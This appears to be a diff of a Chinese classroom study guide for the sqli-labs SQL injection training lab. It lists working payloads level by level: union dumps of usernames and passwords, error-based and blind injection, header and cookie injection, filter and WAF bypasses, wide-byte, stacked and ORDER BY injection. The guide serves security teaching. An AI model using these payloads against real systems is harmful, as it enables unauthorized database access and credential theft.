@@ -1,10 +1,11 @@
 ---
 title: sqli-labs通关笔记
 ---
+## sqli-labs SQL注入关卡练习对照表
 
-## 前言
+### 前言
 
-这份文档用于快速把 SQL 注入手法和 sqli-labs 关卡对应起来。
+这份文档用于帮助学员快速把 SQL 注入手法和 sqli-labs 关卡对应起来。
 
 内容包含：
 
@@ -14,13 +15,13 @@ title: sqli-labs通关笔记
 - 常用测试语句
 - 课堂练习顺序
 
-> 以下语句仅用于本地靶场、sqli-labs、测试环境和授权安全测试。
+> 以下语句仅用于本地靶场、sqli-labs、DVWA、测试环境和授权安全测试。
 
 ---
 
-# 一、总练习路线
+## 一、总练习路线
 
-建议按这个顺序刷：
+建议学员按这个顺序刷：
 
 ```text
 Less-1 ~ Less-4     基础 GET 联合注入
@@ -41,9 +42,9 @@ Less-54 ~ Less-65   综合挑战
 
 ---
 
-# 二、SQL注入基础概念
+## 二、SQL注入基础概念
 
-## 2.1 通俗理解
+### 2.1 通俗理解
 
 SQL注入不是“数据库有后门”，而是后端写代码时把用户输入直接拼进SQL里。
 
@@ -69,7 +70,7 @@ select * from users where id='1' or '1'='1'
 
 ---
 
-## 2.2 判断注入的核心思路
+### 2.2 判断注入的核心思路
 
 最常见三步：
 
@@ -93,9 +94,9 @@ select * from users where id='1' or '1'='1'
 
 ---
 
-# 三、Less-1 到 Less-4：基础 GET 联合注入
+## 三、Less-1 到 Less-4：基础 GET 联合注入
 
-## 对应关卡
+### 对应关卡
 
 | 关卡   | 类型           | 闭合方式   | 推荐练习     |
 | ------ | -------------- | ---------- | ------------ |
@@ -106,9 +107,9 @@ select * from users where id='1' or '1'='1'
 
 ---
 
-## 3.1 Less-1：单引号字符型注入
+### 3.1 Less-1：单引号字符型注入
 
-### 概念
+#### 概念
 
 后端大概率类似：
 
@@ -144,7 +145,7 @@ select * from users where id='1'' limit 0,1
 
 ---
 
-### 测试语句
+#### 测试语句
 
 判断注入：
 
@@ -195,9 +196,9 @@ Less-1/?id=-1' union select 1,group_concat(username,0x3a,password),3 from users 
 
 ---
 
-## 3.2 Less-2：数字型注入
+### 3.2 Less-2：数字型注入
 
-### 概念
+#### 概念
 
 数字型注入不需要闭合引号。
 
@@ -217,7 +218,7 @@ select * from users where id=$id limit 0,1
 
 ---
 
-### 测试语句
+#### 测试语句
 
 判断注入：
 
@@ -247,9 +248,9 @@ Less-2/?id=-1 union select 1,group_concat(username,0x3a,password),3 from users -
 
 ---
 
-## 3.3 Less-3：单引号加括号闭合
+### 3.3 Less-3：单引号加括号闭合
 
-### 概念
+#### 概念
 
 后端可能是：
 
@@ -265,7 +266,7 @@ select * from users where id=('$id') limit 0,1
 
 ---
 
-### 测试语句
+#### 测试语句
 
 判断注入：
 
@@ -287,9 +288,9 @@ Less-3/?id=-1') union select 1,group_concat(username,0x3a,password),3 from users
 
 ---
 
-## 3.4 Less-4：双引号加括号闭合
+### 3.4 Less-4：双引号加括号闭合
 
-### 概念
+#### 概念
 
 后端可能是：
 
@@ -305,7 +306,7 @@ select * from users where id=("$id") limit 0,1
 
 ---
 
-### 测试语句
+#### 测试语句
 
 判断注入：
 
@@ -327,9 +328,9 @@ Less-4/?id=-1") union select 1,group_concat(username,0x3a,password),3 from users
 
 ---
 
-# 四、Less-5 到 Less-6：报错注入
+## 四、Less-5 到 Less-6：报错注入
 
-## 对应关卡
+### 对应关卡
 
 | 关卡   | 类型               | 闭合方式 | 推荐练习                 |
 | ------ | ------------------ | -------- | ------------------------ |
@@ -338,7 +339,7 @@ Less-4/?id=-1") union select 1,group_concat(username,0x3a,password),3 from users
 
 ---
 
-## 4.1 通俗概念
+### 4.1 通俗概念
 
 页面没有正常显示数据库查询结果，但会显示数据库报错。
 
@@ -358,7 +359,7 @@ updatexml / extractvalue 报错
 
 ---
 
-## 4.2 Less-5 测试语句
+### 4.2 Less-5 测试语句
 
 判断注入：
 
@@ -398,7 +399,7 @@ Less-5/?id=1' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,pas
 
 ---
 
-## 4.3 Less-6 测试语句
+### 4.3 Less-6 测试语句
 
 Less-6 是双引号闭合。
 
@@ -420,9 +421,9 @@ Less-6/?id=1" and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,pas
 
 ---
 
-# 五、Less-8：布尔盲注
+## 五、Less-8：布尔盲注
 
-## 对应关卡
+### 对应关卡
 
 | 关卡   | 类型         | 闭合方式 | 推荐练习     |
 | ------ | ------------ | -------- | ------------ |
@@ -430,7 +431,7 @@ Less-6/?id=1" and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,pas
 
 ---
 
-## 5.1 通俗概念
+### 5.1 通俗概念
 
 布尔盲注就是“猜谜”。
 
@@ -445,7 +446,7 @@ Less-6/?id=1" and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,pas
 
 ---
 
-## 5.2 测试语句
+### 5.2 测试语句
 
 判断是否可盲注：
 
@@ -458,7 +459,7 @@ Less-8/?id=1' and 1=2 --+
 
 ---
 
-## 5.3 猜数据库长度
+### 5.3 猜数据库长度
 
 ```http
 Less-8/?id=1' and length(database())=8 --+
@@ -468,7 +469,7 @@ Less-8/?id=1' and length(database())=8 --+
 
 ---
 
-## 5.4 猜数据库名第一位
+### 5.4 猜数据库名第一位
 
 ```http
 Less-8/?id=1' and substr(database(),1,1)='s' --+
@@ -484,7 +485,7 @@ Less-8/?id=1' and ascii(substr(database(),1,1))=115 --+
 
 ---
 
-## 5.5 猜表名
+### 5.5 猜表名
 
 ```http
 Less-8/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=117 --+
@@ -492,9 +493,9 @@ Less-8/?id=1' and ascii(substr((select table_name from information_schema.tables
 
 ---
 
-# 六、Less-9 到 Less-10：时间盲注
+## 六、Less-9 到 Less-10：时间盲注
 
-## 对应关卡
+### 对应关卡
 
 | 关卡    | 类型               | 闭合方式 | 推荐练习   |
 | ------- | ------------------ | -------- | ---------- |
@@ -503,7 +504,7 @@ Less-8/?id=1' and ascii(substr((select table_name from information_schema.tables
 
 ---
 
-## 6.1 通俗概念
+### 6.1 通俗概念
 
 时间盲注也是猜谜，但页面真假没有明显区别。
 
@@ -518,7 +519,7 @@ Less-8/?id=1' and ascii(substr((select table_name from information_schema.tables
 
 ---
 
-## 6.2 Less-9 测试语句
+### 6.2 Less-9 测试语句
 
 判断时间盲注：
 
@@ -547,7 +548,7 @@ Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),0) --+
 
 ---
 
-## 6.3 Less-10 测试语句
+### 6.3 Less-10 测试语句
 
 Less-10 是双引号闭合：
 
@@ -569,9 +570,9 @@ Less-10/?id=1" and if(ascii(substr(database(),1,1))=115,sleep(5),0) --+
 
 ---
 
-# 七、Less-11 到 Less-17：POST 注入
+## 七、Less-11 到 Less-17：POST 注入
 
-## 对应关卡
+### 对应关卡
 
 | 关卡    | 类型                    | 练习点         |
 | ------- | ----------------------- | -------------- |
@@ -585,7 +586,7 @@ Less-10/?id=1" and if(ascii(substr(database(),1,1))=115,sleep(5),0) --+
 
 ---
 
-## 7.1 通俗概念
+### 7.1 通俗概念
 
 GET注入参数在URL里：
 
@@ -603,7 +604,7 @@ uname=admin&passwd=123456
 
 ---
 
-## 7.2 Less-11 POST 联合注入
+### 7.2 Less-11 POST 联合注入
 
 登录框输入：
 
@@ -630,7 +631,7 @@ passwd=123456
 
 ---
 
-## 7.3 Less-12 双引号括号闭合
+### 7.3 Less-12 双引号括号闭合
 
 测试：
 
@@ -648,7 +649,7 @@ passwd=123456
 
 ---
 
-## 7.4 Less-13 报错注入
+### 7.4 Less-13 报错注入
 
 ```text
 uname=admin') and updatexml(1,concat(0x7e,database(),0x7e),1) --+
@@ -657,7 +658,7 @@ passwd=123456
 
 ---
 
-## 7.5 Less-14 双引号报错注入
+### 7.5 Less-14 双引号报错注入
 
 ```text
 uname=admin" and updatexml(1,concat(0x7e,database(),0x7e),1) --+
@@ -666,7 +667,7 @@ passwd=123456
 
 ---
 
-## 7.6 Less-15 布尔盲注
+### 7.6 Less-15 布尔盲注
 
 ```text
 uname=admin' and 1=1 --+
@@ -687,7 +688,7 @@ passwd=123456
 
 ---
 
-## 7.7 Less-16 双引号括号布尔盲注
+### 7.7 Less-16 双引号括号布尔盲注
 
 ```text
 uname=admin") and 1=1 --+
@@ -701,9 +702,9 @@ passwd=123456
 
 ---
 
-## 7.8 Less-17 UPDATE 报错注入
+### 7.8 Less-17 UPDATE 报错注入
 
-### 概念
+#### 概念
 
 Less-17 重点不是查询，而是修改密码时触发SQL注入。
 
@@ -730,9 +731,9 @@ XPATH syntax error: '~security~'
 
 ---
 
-# 八、Less-18 到 Less-19：Header 注入
+## 八、Less-18 到 Less-19：Header 注入
 
-## 对应关卡
+### 对应关卡
 
 | 关卡    | 注入位置   | 推荐练习        |
 | ------- | ---------- | --------------- |
@@ -741,7 +742,7 @@ XPATH syntax error: '~security~'
 
 ---
 
-## 8.1 通俗概念
+### 8.1 通俗概念
 
 很多系统会记录访问日志：
 
@@ -756,7 +757,7 @@ Referer
 
 ---
 
-## 8.2 Less-18 User-Agent 注入
+### 8.2 Less-18 User-Agent 注入
 
 正常请求头：
 
@@ -772,7 +773,7 @@ User-Agent: test' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1
 
 ---
 
-## 8.3 Less-19 Referer 注入
+### 8.3 Less-19 Referer 注入
 
 正常请求头：
 
@@ -788,9 +789,9 @@ Referer: test' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1
 
 ---
 
-# 九、Less-20 到 Less-22：Cookie 注入
+## 九、Less-20 到 Less-22：Cookie 注入
 
-## 对应关卡
+### 对应关卡
 
 | 关卡    | 类型                   | 推荐练习    |
 | ------- | ---------------------- | ----------- |
@@ -800,7 +801,7 @@ Referer: test' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1
 
 ---
 
-## 9.1 通俗概念
+### 9.1 通俗概念
 
 Cookie也是用户可控输入。
 
@@ -814,7 +815,7 @@ select * from users where username='$cookie_user'
 
 ---
 
-## 9.2 Less-20 测试语句
+### 9.2 Less-20 测试语句
 
 登录后修改 Cookie，例如：
 
@@ -830,7 +831,7 @@ Cookie: uname=admin' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
 
 ---
 
-## 9.3 Less-21 Base64 Cookie 注入
+### 9.3 Less-21 Base64 Cookie 注入
 
 Less-21 的 Cookie 通常经过 Base64 编码。
 
@@ -851,7 +852,7 @@ admin' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
 
 ---
 
-## 9.4 Less-22 双引号 Cookie 注入
+### 9.4 Less-22 双引号 Cookie 注入
 
 ```http
 Cookie: uname=admin" and updatexml(1,concat(0x7e,database(),0x7e),1) --+
@@ -859,9 +860,9 @@ Cookie: uname=admin" and updatexml(1,concat(0x7e,database(),0x7e),1) --+
 
 ---
 
-# 十、Less-23 到 Less-28a：过滤绕过
+## 十、Less-23 到 Less-28a：过滤绕过
 
-## 对应关卡
+### 对应关卡
 
 | 关卡     | 主要过滤点          | 推荐练习        |
 | -------- | ------------------- | --------------- |
@@ -878,9 +879,9 @@ Cookie: uname=admin" and updatexml(1,concat(0x7e,database(),0x7e),1) --+
 
 ---
 
-## 10.1 Less-23：注释符过滤
+### 10.1 Less-23：注释符过滤
 
-### 概念
+#### 概念
 
 常规写法：
 
@@ -894,7 +895,7 @@ Cookie: uname=admin" and updatexml(1,concat(0x7e,database(),0x7e),1) --+
 
 ---
 
-### 测试语句
+#### 测试语句
 
 不用注释的布尔判断：
 
@@ -913,9 +914,9 @@ Less-23/?id=-1' union select 1,database(),'3
 
 ---
 
-## 10.2 Less-24：二次注入
+### 10.2 Less-24：二次注入
 
-### 概念
+#### 概念
 
 二次注入分两步：
 
@@ -926,7 +927,7 @@ Less-23/?id=-1' union select 1,database(),'3
 
 ---
 
-### 练习流程
+#### 练习流程
 
 注册用户名：
 
@@ -958,9 +959,9 @@ where username='admin'
 
 ---
 
-## 10.3 Less-25 / Less-25a：过滤 and / or
+### 10.3 Less-25 / Less-25a：过滤 and / or
 
-### 概念
+#### 概念
 
 如果过滤：
 
@@ -980,7 +981,7 @@ or
 
 ---
 
-### 测试语句
+#### 测试语句
 
 ```http
 Less-25/?id=1' && '1'='1' --+
@@ -995,9 +996,9 @@ Less-25/?id=1' aandnd '1'='1' --+
 
 ---
 
-## 10.4 Less-26 / Less-26a：过滤空格和注释
+### 10.4 Less-26 / Less-26a：过滤空格和注释
 
-### 概念
+#### 概念
 
 如果空格被过滤，可以用：
 
@@ -1013,7 +1014,7 @@ Less-25/?id=1' aandnd '1'='1' --+
 
 ---
 
-### 测试语句
+#### 测试语句
 
 ```http
 Less-26/?id=1'%0aand%0a'1'='1
@@ -1027,9 +1028,9 @@ Less-26/?id=-1'%0aunion%0aselect%0a1,database(),'3
 
 ---
 
-## 10.5 Less-27 到 Less-28a：union / select 绕过
+### 10.5 Less-27 到 Less-28a：union / select 绕过
 
-### 概念
+#### 概念
 
 如果过滤 `union select`，可以尝试：
 
@@ -1042,7 +1043,7 @@ Less-26/?id=-1'%0aunion%0aselect%0a1,database(),'3
 
 ---
 
-### 测试语句
+#### 测试语句
 
 大小写：
 
@@ -1064,9 +1065,9 @@ Less-28/?id=-1')%0aunion%0aselect%0a1,database(),3 --+
 
 ---
 
-# 十一、Less-29 到 Less-31：WAF / 参数污染
+## 十一、Less-29 到 Less-31：WAF / 参数污染
 
-## 对应关卡
+### 对应关卡
 
 | 关卡    | 类型           | 推荐练习 |
 | ------- | -------------- | -------- |
@@ -1076,7 +1077,7 @@ Less-28/?id=-1')%0aunion%0aselect%0a1,database(),3 --+
 
 ---
 
-## 11.1 通俗概念
+### 11.1 通俗概念
 
 HPP 是 HTTP Parameter Pollution，参数污染。
 
@@ -1097,7 +1098,7 @@ WAF看到的是安全参数
 
 ---
 
-## 11.2 测试语句
+### 11.2 测试语句
 
 Less-29：
 
@@ -1119,9 +1120,9 @@ Less-31/?id=1&id=-1") union select 1,database(),3 --+
 
 ---
 
-# 十二、Less-32 到 Less-37：宽字节注入
+## 十二、Less-32 到 Less-37：宽字节注入
 
-## 对应关卡
+### 对应关卡
 
 | 关卡    | 类型                               | 推荐练习   |
 | ------- | ---------------------------------- | ---------- |
@@ -1134,7 +1135,7 @@ Less-31/?id=1&id=-1") union select 1,database(),3 --+
 
 ---
 
-## 12.1 通俗概念
+### 12.1 通俗概念
 
 普通转义：
 
@@ -1171,7 +1172,7 @@ Less-31/?id=1&id=-1") union select 1,database(),3 --+
 
 ---
 
-## 12.2 Less-32 测试语句
+### 12.2 Less-32 测试语句
 
 判断注入：
 
@@ -1193,7 +1194,7 @@ Less-32/?id=-1%df' union select 1,group_concat(username,0x3a,password),3 from us
 
 ---
 
-## 12.3 Less-33 / Less-36 测试语句
+### 12.3 Less-33 / Less-36 测试语句
 
 ```http
 Less-33/?id=-1%df' union select 1,database(),version() --+
@@ -1205,7 +1206,7 @@ Less-36/?id=-1%df' union select 1,database(),version() --+
 
 ---
 
-## 12.4 Less-34 / Less-37 POST 宽字节
+### 12.4 Less-34 / Less-37 POST 宽字节
 
 POST参数中提交：
 
@@ -1223,9 +1224,9 @@ passwd=123456
 
 ---
 
-# 十三、Less-38 到 Less-45：堆叠注入
+## 十三、Less-38 到 Less-45：堆叠注入
 
-## 对应关卡
+### 对应关卡
 
 | 关卡    | 类型               | 推荐练习   |
 | ------- | ------------------ | ---------- |
@@ -1240,7 +1241,7 @@ passwd=123456
 
 ---
 
-## 13.1 通俗概念
+### 13.1 通俗概念
 
 普通注入只是在一条SQL里做文章：
 
@@ -1263,7 +1264,7 @@ union 是合并查询结果
 
 ---
 
-## 13.2 Less-38 测试语句
+### 13.2 Less-38 测试语句
 
 判断是否支持多语句：
 
@@ -1283,7 +1284,7 @@ Less-38/?id=1'; select database() --+
 
 ---
 
-## 13.3 Less-39 数字型堆叠
+### 13.3 Less-39 数字型堆叠
 
 ```http
 Less-39/?id=1; select sleep(5) --+
@@ -1291,7 +1292,7 @@ Less-39/?id=1; select sleep(5) --+
 
 ---
 
-## 13.4 Less-40 括号闭合
+### 13.4 Less-40 括号闭合
 
 ```http
 Less-40/?id=1'); select sleep(5) --+
@@ -1299,7 +1300,7 @@ Less-40/?id=1'); select sleep(5) --+
 
 ---
 
-## 13.5 Less-42 登录框堆叠
+### 13.5 Less-42 登录框堆叠
 
 在用户名或密码处测试：
 
@@ -1312,9 +1313,9 @@ login_password=123456
 
 ---
 
-# 十四、Less-46 到 Less-53：Order By 注入
+## 十四、Less-46 到 Less-53：Order By 注入
 
-## 对应关卡
+### 对应关卡
 
 | 关卡    | 类型                  | 推荐练习  |
 | ------- | --------------------- | --------- |
@@ -1329,7 +1330,7 @@ login_password=123456
 
 ---
 
-## 14.1 通俗概念
+### 14.1 通俗概念
 
 很多业务允许用户控制排序：
 
@@ -1349,7 +1350,7 @@ select * from users order by $sort
 
 ---
 
-## 14.2 Less-46 测试语句
+### 14.2 Less-46 测试语句
 
 正常访问：
 
@@ -1371,7 +1372,7 @@ Less-46/?sort=if(ascii(substr(database(),1,1))=115,sleep(5),1)
 
 ---
 
-## 14.3 Less-47 字符型 ORDER BY
+### 14.3 Less-47 字符型 ORDER BY
 
 ```http
 Less-47/?sort=1' and if(1=1,sleep(5),1) --+
@@ -1385,7 +1386,7 @@ Less-47/?sort=1' procedure analyse(extractvalue(rand(),concat(0x7e,database())),
 
 ---
 
-## 14.4 Less-50 到 Less-53 堆叠型 ORDER BY
+### 14.4 Less-50 到 Less-53 堆叠型 ORDER BY
 
 Less-50 数字型：
 
@@ -1413,9 +1414,9 @@ Less-53/?sort=1'; select if(length(database())=8,sleep(5),0) --+
 
 ---
 
-# 十五、Less-54 到 Less-65：综合挑战
+## 十五、Less-54 到 Less-65：综合挑战
 
-## 对应关卡
+### 对应关卡
 
 | 关卡    | 主要类型                 | 推荐练习  |
 | ------- | ------------------------ | --------- |
@@ -1434,7 +1435,7 @@ Less-53/?sort=1'; select if(length(database())=8,sleep(5),0) --+
 
 ---
 
-## 15.1 通俗概念
+### 15.1 通俗概念
 
 这一组不是教新语法，而是考综合判断：
 
@@ -1454,7 +1455,7 @@ Less-53/?sort=1'; select if(length(database())=8,sleep(5),0) --+
 
 ---
 
-## 15.2 Less-54 示例
+### 15.2 Less-54 示例
 
 判断闭合：
 
@@ -1476,7 +1477,7 @@ Less-54/?id=-1' union select 1,database(),3 --+
 
 ---
 
-## 15.3 Less-55 示例
+### 15.3 Less-55 示例
 
 常见闭合为：
 
@@ -1498,7 +1499,7 @@ Less-55/?id=-1) union select 1,database(),3 --+
 
 ---
 
-## 15.4 Less-58 报错挑战
+### 15.4 Less-58 报错挑战
 
 ```http
 Less-58/?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
@@ -1506,7 +1507,7 @@ Less-58/?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
 
 ---
 
-## 15.5 Less-62 布尔盲注挑战
+### 15.5 Less-62 布尔盲注挑战
 
 判断真假：
 
@@ -1529,9 +1530,9 @@ Less-62/?id=1' and ascii(substr(database(),1,1))=115 --+
 
 ---
 
-# 十六、按注入手法快速索引
+## 十六、按注入手法快速索引
 
-## 16.1 联合查询注入 Union Based
+### 16.1 联合查询注入 Union Based
 
 对应关卡：
 
@@ -1565,7 +1566,7 @@ Less-57
 
 ---
 
-## 16.2 报错注入 Error Based
+### 16.2 报错注入 Error Based
 
 对应关卡：
 
@@ -1600,7 +1601,7 @@ Less-61
 
 ---
 
-## 16.3 布尔盲注 Boolean Blind
+### 16.3 布尔盲注 Boolean Blind
 
 对应关卡：
 
@@ -1631,7 +1632,7 @@ Less-65
 
 ---
 
-## 16.4 时间盲注 Time Based
+### 16.4 时间盲注 Time Based
 
 对应关卡：
 
@@ -1663,7 +1664,7 @@ Less-65
 
 ---
 
-## 16.5 二次注入 Second Order
+### 16.5 二次注入 Second Order
 
 对应关卡：
 
@@ -1689,7 +1690,7 @@ Less-24
 
 ---
 
-## 16.6 宽字节注入 Wide Byte
+### 16.6 宽字节注入 Wide Byte
 
 对应关卡：
 
@@ -1716,7 +1717,7 @@ Less-37
 
 ---
 
-## 16.7 堆叠注入 Stacked Queries
+### 16.7 堆叠注入 Stacked Queries
 
 对应关卡：
 
@@ -1750,7 +1751,7 @@ Less-53
 
 ---
 
-## 16.8 Header 注入
+### 16.8 Header 注入
 
 对应关卡：
 
@@ -1775,7 +1776,7 @@ X-Forwarded-For
 
 ---
 
-## 16.9 Cookie 注入
+### 16.9 Cookie 注入
 
 对应关卡：
 
@@ -1799,7 +1800,7 @@ Cookie: uname=admin' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
 
 ---
 
-## 16.10 Order By 注入
+### 16.10 Order By 注入
 
 对应关卡：
 
@@ -1828,7 +1829,7 @@ Less-53
 
 ---
 
-# 十七、练习口诀
+## 十七、练习口诀
 
 ```text
 先看报错，判断闭合；
@@ -1847,9 +1848,9 @@ Less-53
 
 ---
 
-# 十八、练习建议顺序
+## 十八、课堂练习建议顺序
 
-## 第一阶段：基础入门
+### 第一阶段：基础入门
 
 ```text
 Less-1
@@ -1864,7 +1865,7 @@ Less-4
 掌握闭合方式、字段数、回显位、union select
 ```
 
-## 第二阶段：无回显场景
+### 第二阶段：无回显场景
 
 ```text
 Less-5
@@ -1880,7 +1881,7 @@ Less-10
 掌握报错注入、布尔盲注、时间盲注
 ```
 
-## 第三阶段：参数位置变化
+### 第三阶段：参数位置变化
 
 ```text
 Less-11
@@ -1898,7 +1899,7 @@ Less-22
 理解 GET / POST / Header / Cookie 本质一样
 ```
 
-## 第四阶段：绕过与进阶
+### 第四阶段：绕过与进阶
 
 ```text
 Less-23
@@ -1918,7 +1919,7 @@ Less-36
 掌握过滤绕过、二次注入、宽字节注入
 ```
 
-## 第五阶段：复杂SQL位置
+### 第五阶段：复杂SQL位置
 
 ```text
 Less-38
@@ -1936,7 +1937,7 @@ Less-53
 掌握堆叠注入、order by 注入
 ```
 
-## 第六阶段：综合考核
+### 第六阶段：综合考核
 
 ```text
 Less-54 ~ Less-65
